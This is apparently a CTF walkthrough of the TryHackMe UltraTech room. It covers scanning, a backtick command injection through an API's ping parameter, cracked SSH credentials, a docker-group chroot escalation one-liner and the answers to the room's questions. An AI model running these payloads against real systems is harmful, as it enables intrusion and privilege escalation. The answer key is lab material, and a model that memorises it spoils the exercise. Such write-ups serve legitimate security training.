`Tryhackme  UltraTech`
--
By :- Unknownperson
-- 

## Port Scanning
Open 10.10.75.242:21
Open 10.10.75.242:22
Open 10.10.75.242:8081
Open 10.10.75.242:31331

## Full Nmap Scanning
PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp         vsftpd 3.0.3
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
1099/tcp filtered rmiregistry
5544/tcp filtered unknown
8081/tcp open     http        Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
|
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
|_http-server-header: Apache/2.4.29 (Ubuntu)

-> Ftp Port is open but anonymous login is not set

Q1. Which software is using the port 8081? -> Node.js
Q2. Which other non-standard port is used? -> 31331
Q3. Which software using this port? -> Apache
Q4. Which GNU/Linux distribution seems to be used? -> Ubuntu
Q5. The software using the port 8081 is a REST api, how many of its routes are used by the web application? -> 2 (By using command [traceroute [IP] ])
--

## Directory Busting -> Using Gobuster
/.php                 (Status: 403) [Size: 294]
/images               (Status: 301) [Size: 322] [--> http://10.10.75.242:31331/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.75.242:31331/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.75.242:31331/js/]
/javascript           (Status: 301) [Size: 326] [--> http://10.10.75.242:31331/javascript/]
/robots.txt  

> Robots.txt contain :- Sitemap: /utech_sitemap.txt
> And when we Redirect to utech_sitemap.txt it contain info like :- /
/index.html
/what.html
/partners.html


-> /partners.html contain Login 
But Login panel not work in sqlinjection or any type of default Password

-> so we check Source code and we get Line like 
## const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
we have port 8081 where API is working 
-> http://10.10.75.242:8081/ping?ip=`ls` :- this will help in injecting command 


*lets Take First Shell by Doing this *
-> First we get That utech.db.sqlite File Read which give us
ping: ) r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

`
SSH Password:- r00t:n100906
`



Q6. There is a database lying around, what is its filename? :- utech.db.sqlite
Q7. What is the first user's password hash? :- 
--

## Privillage Escalation

> In User R00t Id show us:- uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)

> Which Mean stragth forword Docker Escalation let Get root Shell with Below Command
## `docker run -v /:/mnt --rm -it bash chroot /mnt sh` 
-> In this Docker image name was 'bash' 
-> we get the Rsa key access 

Q8.What are the first 9 characters of the root user's private SSH key? :- MIIEogIBA	
--

## Wooow Again We crecked the Machine
